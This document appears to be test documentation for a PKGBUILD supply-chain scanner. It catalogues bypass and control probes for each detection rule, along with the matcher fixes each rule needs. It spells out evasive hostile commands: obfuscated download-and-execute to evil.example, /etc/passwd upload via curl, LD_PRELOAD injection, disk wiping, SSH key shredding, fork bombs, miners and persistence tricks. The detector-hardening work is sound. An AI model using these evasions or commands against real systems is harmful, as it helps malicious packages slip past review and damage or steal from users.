# Bypass evasion probes

Every shape below has two cells in `inputs.yml` (R003 has two shapes,
so three cells):

- `<RULE>-bypass` — the equivalent-but-dodging form. `expect_absent: [<RULE>]`.
- `<RULE>-control` — the literal form. `expect_fire: [<RULE>]`.

A passing run therefore proves the matcher still misses the evasive shape
while still catching the literal one. When a matcher is fixed, the bypass cell
fails (the rule now fires) and should be moved into the rule's positive cell
set; the control keeps guarding the literal shape.

All cells were measured with `harness analyze_diff` on TrustSight 0.30.0
(2026-11-24). `tree_not_analyzed` is present on every text-lane report and is
not counted as a bypass; cells that additionally produced an
`unresolved_parse_time`/`stage_degraded` gap were not used here, because that
is a fail-closed refusal, not silence.

| Rule | Evasion | Matcher | Required matcher change |
|---|---|---|---|
| C001 | Checksum repointed by editing only `_sum=('...')` while `sha256sums=("${_sum[@]}")` and pkgver stay fixed. | `analysis/structural/_engine.py:496` | The checksum delta must compare resolved entries, so a changed hash variable is a changed checksum. |
| C020 | Credentials in the query string: `https://example.org/x.tar.gz?token=SECRETTOKEN`. | `analysis/structural/_checksums.py:450` | The rule checks URL userinfo only; also match query keys `token|key|secret|password|sig|X-Amz-Credential|access_token`. |
| D003 | Network makedepend introduced via `read -r _d <<< curl; makedepends=('cmake' "$_d")`. | `analysis/dependencies.py:367` | `extract_dependency_changes` drops `$`-bearing entries (`is_ignorable`); resolve `read`/scalar-assigned names instead of dropping them. |
| D004 | `provides` hijack introduced via `read -r _p <<< bash; provides=('probe' "$_p")`. | `analysis/dependencies.py:381` | Same resolution gap for `provides`/`replaces`. |
| E001 | Keep the blob and pad the diff with 70 diverse 5-hex comment lines; gzip ratio 0.027 -> 0.3148 (floor 0.2302) | `analysis/entropy.py:189` | Measure per contiguous blob/token, or take the maximum over regions, so padding cannot dilute the ratio. |
| E002 | Same padding dilutes the encoded-token fraction 1.0 -> 0.0603 (floor 0.8889) | `analysis/entropy.py:202` | Same: per-region fraction, not whole-diff. |
| E003 | Packed identifiers assigned with `printf -v Ax7Bq3Kz '%s' one` instead of `Ax7Bq3Kz=one`; `_IDENT_RE` requires `name=` | `analysis/entropy.py:220` (`_IDENT_RE` :36) | Include `printf -v` and `declare` assignments in the identifier set. |
| H001 | `sha256sums=("${_skip[@]}")` with `_skip=('SK' 'IP')`-style split literal: the checksum text is `SK''IP`, so `_CHK_SKIP_WORD_RE` misses while makepkg still reads SKIP. H065 (INFO) reconstructs the literal but does not feed `checksum_behavior`. | `analysis/structural/_engine.py:328` via `differ/_checksums.py:498` | When H065 reconstructs an obfuscated literal, re-run the checksum classification on the reconstructed text (or make `_resolve_checksum_text` unquote/concatenate the split literal). |
| H004 | `su root -c 'install ... /usr/local/bin/evil'` in `package()`. | `analysis/persistence_engine.py:247` (`_PRIVILEGE_WRAPPERS` / `_sudo_escalates`) | Add `su` (with `root`/`-c`) and the other escalators (`doas`, `pkexec`, `runuser`) to the wrapper list. |
| H019 | `https://...` -> `_proto=http; source=("${_proto}://...")` for the same URL. | `analysis/url_engine.py:96` | The `url.replace("https://","http://",1) in after` membership test needs resolved URLs on both sides, not raw array entries. |
| H025 | `export LD_PRELOAD=/tmp/evil.so` at top level, outside `build()`/`package()`. | `analysis/build.py:858` | The `scopes.within(i, _CRITICAL_FUNCTIONS)` gate hides top-level assignments; a PKGBUILD is sourced as a script, so a top-level `LD_PRELOAD` must be in scope. |
| H032 | Home drop spelled `/home/alice/.config/autostart/...` instead of `$HOME/...`. | `analysis/persistence_engine.py:151` (`_HOME_PREFIX_RE`, `analysis/persistence.py:253`) | Extend `_HOME_PREFIX_RE` to `/home/<user>/` and `/root/` (keeping the staged-tree exemption). |
| H033 | Moved git ref hidden in `_ref=bbbbbbb` and `source=('...git#commit=${_ref}')`; the literal fragment never changes. | `analysis/network.py:237` | Resolve `#commit=${var}` and `#tag=${var}` through the recipe's scalars before comparing before/after refs. |
| H038 | Work staged in `/tmp` reached as `printf -v _d '%s' /tmp; cd "$_d"`. | `analysis/persistence_engine.py:168` | Resolve scalar/`printf -v` values in `cd` and write targets before `_WW_DIR_RE`/`_WW_CD_RE`. |
| H039 | `ExecStart=%T/evil` (systemd specifier for a runtime-writable dir). | `analysis/persistence_engine.py:106` (`_RUNTIME_WRITABLE_RE`, `analysis/persistence.py:310`) | Add the systemd specifiers `%T %t %S %C %E` (and `%h` already present) to the runtime-writable alternatives. |
| H041 | Upload target and file argument built with `printf -v _h '%s' 0x0.st` / `printf -v _f '%s' /etc/passwd`, then `curl -F "file=@$_f" "https://$_h"`. | `analysis/edges.py:272` (upload edge) | Read the tokenizer's resolved records: `printf -v` assignments are ordinary scalar definitions and must fold like `name=value`. |
| H042 | Hidden drop `install -Dm755 evil.sh "/opt/$_n"` with `printf -v _n '%s' .evil`. | `analysis/persistence.py:358` (`_HIDDEN_NAME_RE`) | Resolve the install target before taking its basename, so `$_n` is `.evil`. |
| H062 | Pacman hook installed to `$_d/evil.hook` with `printf -v _d '%s' /usr/share/libalpm/hooks`. | `analysis/persistence_engine.py:121` | Resolve variable-held directories before `_PACMAN_HOOK_RE`/`_norm_path`. |
| H063 | Epoch introduced with `printf -v epoch '%s' 1` instead of `epoch=1`. | `analysis/version.py:470` | Also accept `printf -v epoch`, `declare epoch=`, and `epoch=${...}` when reading the post-state epoch. |
| H064 | `provides` scope expansion via `printf -v _n '%s' firefox; provides=('probe' "$_n")`. | `analysis/dependencies.py:150` | Resolve `printf -v`/scalar-assigned entries before the added-claims comparison (same resolution gap as D004). |
| H077 | Parse-time fetch through a top-level helper: `_c=curl; _fetch() { "$_c" "$@"; }; _fetch https://...`. | `analysis/network.py:559` | Follow a direct top-level call into the helper body and resolve the variable-held client. |
| H079 | Hardening flag split by quote concatenation: `CFLAGS="-fno-stack"-protector`. | `analysis/_build_flags.py:17` | Reconstruct adjacent quoted/unquoted fragments before matching `-fno-stack-protector`. |
| H083 | Declared unpinned source executed via `exec 3<"$srcdir/stage.sh"; bash /dev/fd/3`. | `analysis/delivery/__init__.py:574` | Track descriptor redirections: `/dev/fd/N` inherits the file opened on fd N, not basename `N`. |
| H085 | `export PATH="$PWD/_bin:$PATH"` in `build()`; `$PWD` is `$srcdir` after makepkg's `cd`. | `analysis/persistence_engine.py:394` (`_PATH_BUILD_DIR_RE`) | Add `$PWD` (and `${PWD}`) to the build-dir alternatives, or resolve `$PWD` to the build directory before matching. |
| H094 | Local script executed via `exec 3<./mystery.sh; bash /dev/fd/3`. | `analysis/delivery/__init__.py:743` | Same descriptor tracking as H083 for the unread local-script case. |
| H096 | `DLAGENTS[0]='https::/usr/bin/curl -fsSL -o %u'` (array element assignment). | `analysis/network.py:761` (`_DLAGENTS_VAR_RE`) | Accept `DLAGENTS[<n>]=` and `DLAGENTS+=` as the same override as a whole-array `DLAGENTS=`. |
| H097 | Function shadowing written `function cp { /bin/cp "$@"; }` (no parentheses). | `analysis/_function_shadowing.py:9` | Accept the `function name {` and `function name()` spellings, not only `name() {`. |
| H108 | `systemctl --now enable evil.service`. | `analysis/build.py:323` (`_SERVICE_ENABLE_RE`) | Allow arbitrary systemctl options before `enable` (`--now`, `--global`, `--root=...`), not only `--user`. |
| P001 | Checksums declared with `sha256sums+=("${_sum[@]}")`; the declaration regex requires `\s*=` | `differ/_checksums.py:541` | Accept `+=` in the checksum-declaration regex. |
| P002 | `validpgpkeys=("${_k[@]}")`; the regex needs literal hex after `(` | `differ/_verification.py:15` | Resolve array references before the 16-hex test. |
| P003 | `_g=gpg; "$_g" --verify ...`; the regex needs a literal tool name | `differ/_verification.py:10` | Resolve scalar-held tool names before matching `gpg --verify`. |
| P005 | Commit pin abbreviated to 6 hex chars (`#commit=abc123`); git resolves >=4, regex wants {7,40}, so P008 misfires | `buckets.py:459` (`_COMMIT_REF_RE`) | Accept 4-40 hex chars (git's minimum abbreviation). |
| R003 | `bash <(base64 -d <<< ZXZpbA==)` — the decoded payload runs without a pipe. | `config/_default_rules.py:35` | The pattern requires an unescaped `\|`; also match decode feeding an interpreter via process substitution or a staged file (`base64 -d ... > f; bash f`). |
| R003 | Decode via GNU long-option abbreviation: `base64 --dec | sh`. | `config/_default_rules.py:35` | Match unambiguous long-option prefixes (`--dec`, `--deco`) or resolve argv through getopt semantics. |
| R042 | Download-then-execute with the staged binary run as `"$PWD/stage.sh"`. | `config/_default_rules.py:225` | The sink alternation needs resolved build-dir paths (`$PWD`, `$srcdir`), not only `./`, `/tmp/`, `bash`/`sh`. |
| R045 | `bash <(xxd -r -p <<< 6576696c)`. | `config/_default_rules.py:250` | Same pipe requirement for `xxd`/`uudecode`; match process substitution as a sink. |
| R058 | Write outside the staging root via `/usr/bin/install -Dm644 x /etc/x`. | `config/_default_rules.py:535` | Allow an absolute path to `install` (and other coreutils wrappers), not only a bare `install`. |
| R078 | Compression command disabled with `COMPRESSZST[0]='cat'`. | `config/_default_rules.py:549` | Accept array-element and `+=` assignments to every COMPRESS* variable. |
| S001 | Fork bomb as a multi-line function: `:(){\n:|:&\n};:` | `analysis/sabotage.py:494` (`_FORK_BOMB_DEF_RE`) | Run function definitions through the shell AST/tokenizer so a multi-line body is one definition. |
| S002 | `printf -v _t /home; rm -rf "$_t"` | `analysis/sabotage.py:502` | The resolver records `name=value` only; record `printf -v name` and `declare` too, or flag unresolved targets on destructive verbs. |
| S003 | `printf -v _D /dev/sda; dd of="$_D"` | `analysis/sabotage.py:511` | Same printf-v resolution for `dd of=`. |
| S004 | `printf -v _h "$HOME"` + `printf -v _s ssh; shred "$_h/.$_s/id_rsa"` | `analysis/sabotage.py:516` | Same printf-v resolution before the home-marker match. |
| S005 | `printf -v _e /etc; chmod 777 "$_e/passwd"` | `analysis/sabotage.py:521` | Same printf-v resolution for chmod/chown targets. |
| S006 | `printf -v _u sshd; systemctl stop "$_u"` | `analysis/sabotage.py:527` | Same printf-v resolution for critical unit names. |
| S007 | miner and flag split: `printf -v _m xmrig`; `printf -v _f '%s' --donate-` + `_g level` | `analysis/sabotage.py:532` | Resolve printf-v values and match `--donate-level` after concatenation. |
| S008 | `printf -v _c history; "$_c" -c` | `analysis/sabotage.py:537` | Same printf-v resolution for history commands. |
| T004 | Vouch surface shrunk by editing `_k` only (`_k=('A' 'B')` -> `_k=('A')`) while `validpgpkeys=("${_k[@]}")` stays identical. | `analysis/structural/_missing_self.py:113` | Same: expand the indirection before `before - after`; an unresolved reference must not read as "no keys lost". |
| T005 | Scheme downgrade where the new scheme comes from `_proto=http` (`"${_proto}://host/..."`); `by_host` only sees literal `http://`. | `analysis/structural/_missing_self.py:193` | Use the tokenizer's resolved source URLs (or resolve `$var` before `by_host`) so a variable scheme still yields an `http://` entry. |

Notes:
- E/P/S rows: the S cells share one payload (multi-line fork bomb plus printf-v
  targets); the control fires S001-S008 together and the bypass leaves only
  X002 (score 40). The E bypass is a whole-report clean (flagged=false, 0).
- P001-P003 and P005 are weight-0 INFO: they live in `score_breakdown`, never in
  `report.findings`, so the campaign probe reads them from the breakdown. Their
  bypass changes no verdict. P004 does not exist (contract.py skips it).

- Retracted: the H035 `np{m}` and H067 `systemd-detect-{virt}` cells were
  removed. A single-item brace expression is literal in bash (`np{m}` is not
  expanded), so those recipes never ran the command and were not bypasses.
  Absolute paths, `command X` and scalar-held commands were all normalised by
  the resolver, so no replacement dodge was found for either rule.
- T003 is not a cell here.  The rotation bypass (`_pgpkey=(...)` +
  `validpgpkeys=("${_pgpkey[@]}")`) is confirmed through `harness
  analyze_diff --old_text/--new_text` (control fires T003, 65; bypass 0), but
  the committed raw-diff campaign lane drops T003 before scoring: the control
  cell reports `pgp_keys.gained/lost` in `report.change` yet only H078/T004
  reach `report.findings`.  Probe T003 from the text lane until the two
  producers agree.
- H001 is the weakest entry: H001 is silent, but H065 (`Obfuscated Literal
  Reconstructed`, INFO, weight 0) does name the reconstructed `SKIP`. It is a
  split detection, not a clean miss.
- R003 has two bypass cells (process substitution, and the `--dec` long-option
  abbreviation); the rule is silent in both, and `R043`/`X023` catch parts of
  the chain.
- Not evadable in this lane: R001/R002 (`curl|env bash`, `bash <(curl ...)`)
  still fire, because the resolver folds `env` and process substitution is
  caught by H075. H040 does not fire on a literal control through
  `analyze_diff`, so it is out of reach, not evaded.
- H032, H033, H041, C001 and R003 are also caught in part by sibling rules
  (`H076`/`X005`, `SOURCE_BUCKET`, `H016`/`R010`, `E002`, `R043`); the cell
  asserts only that the named rule stays silent.

## Unflagged misses (whole report) - NOT harness `bypass` status

`docs/reference/statuses.md` defines `bypass` as sanitization OK, `bash -n` OK,
constraints honoured, **behaviour proven**, and UNFLAGGED with no coverage gap.
The shapes below are UNFLAGGED (score 0, no findings) but the behaviour
validator cannot prove them - only the `fetch_then_execute` goal exists, and it
cannot follow printf escapes, top-level scalar helpers, fd execution, or chains
in `post_install()`. In harness accounting they are `behavior_lost` (unproven,
lower bound), not bypasses. Six chains the validator *does* prove
(`curl -> python/node/lua s`, `curl | node`, `curl | deno`,
`npm install -> node ...`) were all flagged by TrustSight at 25-100, so no
harness-defined full bypass was found.

Measured 24/11/26 on 0.30.0 through `harness analyze_diff`: `report.flagged`
is False, score 0, no findings. Each has a literal control that is flagged.

| Surface | Unflagged form | Control (flagged score) |
|---|---|---|
| fetch-then-execute (compose) | `printf -v _url` builds the URL, `_c=curl; _fetch() { "$_c" "$@"; }` fetches at top level to `$startdir/stage.sh`, `build()` runs `exec 3<"$startdir/stage.sh"; bash /dev/fd/3` | `curl ... \| bash` (65) |
| fetch-then-execute (encoded) | `bash <(printf '\143\165\162\154\40...')` — octal-escaped `curl ... \| sh` executed from process substitution | `curl ... \| sh` (70) |
| obfuscated payload | same octal form (`printf '\x63\x75...'` also works); H068 reconstructs base64 and hex, not printf escapes | literal base64/hex chain (25-100) |
| integrity | `_sum=('bbbb...')` + `sha256sums=("${_sum[@]}")` repoints the artifact at the same version | literal `sha256sums=('bbbb...')` (40) |
| persistence | `su root -c 'install -Dm755 evil /usr/local/bin/evil'` in `package()` | `sudo install ...` (65) |
| persistence (full package) | `printf -v _d /tmp; cd "$_d"` staging, compiled setuid-root helper installed `-Dm4755`, unit with `ExecStart=%T/...`, enabled symlink via `_u=...; ln -s "$_u"` | `cd /tmp` + `install -m 4755` + `ExecStart=/tmp/...` + literal symlink (100: H038,H039,H043,H069,R053,R054) |
| version | `_ref` changed under `#commit=${_ref}` | literal `#commit=bbbbbbb` (35) |
| version/trust (combined) | `_pgpkey` rotates A+B to C and `printf -v epoch '%s' 1` introduces the epoch, with `validpgpkeys=("${_pgpkey[@]}")` unchanged and pkgver/pkgrel fixed | literal `epoch=1` + `validpgpkeys=('CCCC...')` (55: T003,T004,H063) |
| dependencies | `read -r _p <<< bash; provides=('probe' "$_p")` | `provides=('probe' 'bash')` (50) |
| exec sink | `exec 3<./mystery.sh; bash /dev/fd/3` | `bash ./mystery.sh` (25) |

Caveats: the harness behaviour validator cannot evaluate these shapes either —
it reports `behavior_lost` for the octal chain and `syntax_error` for both the
compose bypass and its control (its diff-to-text reconstruction rejects a
recipe `bash -n` accepts). Prove the chain by reading it: the compose form runs
`curl` at parse time and `bash /dev/fd/3` in `build()`; the octal form decodes
to `curl -fsSL http://evil.example/stage.sh | sh`.
`D003` alone scores 15, below the review threshold, so the dependency control
above is the `D004` provides hijack. The former `np{m}` build-hooks row is
retracted: bash does not expand a single-item brace expression, so the command
never ran.